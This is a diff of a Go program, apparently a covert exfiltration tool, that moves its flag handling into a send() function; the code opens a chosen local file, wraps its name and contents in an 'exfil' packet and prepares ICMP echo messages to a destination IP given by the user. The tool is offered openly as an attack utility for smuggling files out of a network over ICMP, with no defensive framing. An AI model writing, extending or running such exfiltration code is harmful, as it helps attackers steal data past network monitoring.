@@ -1,7 +1,6 @@
 package main
 
 import (
-	"flag"
 	"fmt"
 	"io"
 	"log"
@@ -12,23 +11,7 @@ import (
 	"golang.org/x/net/ipv4"
 )
 
-const BUFFERSIZE = 512
-const IPV4ICMP = 8
-
-func main() {
-	var file = flag.String("f", "", "the file to exfiltrate via ICMP")
-	var debug = flag.Bool("d", false, "enable debug output")
-	var help = flag.Bool("h", false, "show help.")
-	var host = flag.String("l", "127.0.0.1", "the location ip to send the file to")
-
-	flag.Parse()
-
-	// Print help
-	if *help || len(os.Args) == 1 {
-		flag.PrintDefaults()
-		return
-	}
-
+func send(file *string, debug *bool, host *string) {
 	// Open the local file
 	f, err := os.Open(*file)
 	if err != nil {
@@ -43,7 +26,7 @@ func main() {
 	// Initialize data packet
 	exfilPak := exfil{true, false, filepath.Base(*file), buf}
 	echoPak := icmp.Echo{ID: MAGIC, Seq: 0, Data: nil}
-	fullPak := icmp.Message{Type: ipv4.ICMPType(IPV4ICMP), Code: 1, Checksum: 0, Body: &echoPak}
+	fullPak := icmp.Message{Type: ipv4.ICMPType(IPV4ICMPREQUEST), Code: 1, Checksum: 0, Body: &echoPak}
 
 	// open up the "socket"
 	socket, sockErr := icmp.ListenPacket("ip4:icmp", *host)
